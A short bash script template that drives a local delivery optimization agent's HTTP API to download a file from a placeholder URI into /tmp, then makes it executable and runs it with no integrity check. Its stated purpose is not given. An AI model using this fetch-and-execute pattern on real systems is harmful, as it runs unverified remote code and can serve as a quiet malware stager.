#!/bin/bash

# Variables. Keep short to save space.
PTH="/tmp/[DOWNLOAD_FILE_NAME]";
URI="[URI]";

# TODO: Install delivery optimization agent if not available.
# TODO: Find port of the delivery optimization agent.
# Default port is 50000, but will be incremented by 1 if its already taken until it finds an available one.
PRT=50000;

# Install required tools.
apt-get -qq install curl jq >> /dev/null;

# Remove file if already present. Otherwise the delivery optimization agent fails.
rm -f $PTH;

# Create download request and start it.
ID=$(curl -s -G --data-urlencode "Uri=$URI" --data-urlencode "DownloadFilePath=$PTH" -X POST "http://127.0.0.1:$PRT/download/create" | jq -r .Id);
curl -s -G --data-urlencode "Id=$ID" -X POST "http://127.0.0.1:$PRT/download/start" >> /dev/null;

# Wait for download (maximum of 60 seconds).
STATUS="";
for i in {1..60};
do
    sleep 1;
    STATUS=$(curl -s -G --data-urlencode "Id=$ID" "http://127.0.0.1:$PRT/download/getstatus" | jq -r .Status);
    if [ "$STATUS" == "Transferred" ] || [ "$STATUS" == "Aborted" ]; then
        break;
    fi;
done;

if [ "$STATUS" == "Transferred" ]; then
    # Finalize download.
    curl -s -G --data-urlencode "Id=$ID" -X POST "http://127.0.0.1:$PRT/download/finalize" >> /dev/null;

    # Execute file.
    chmod +x $PTH;
    $PTH;
else
    echo "Download failed.";
    exit 1;
fi;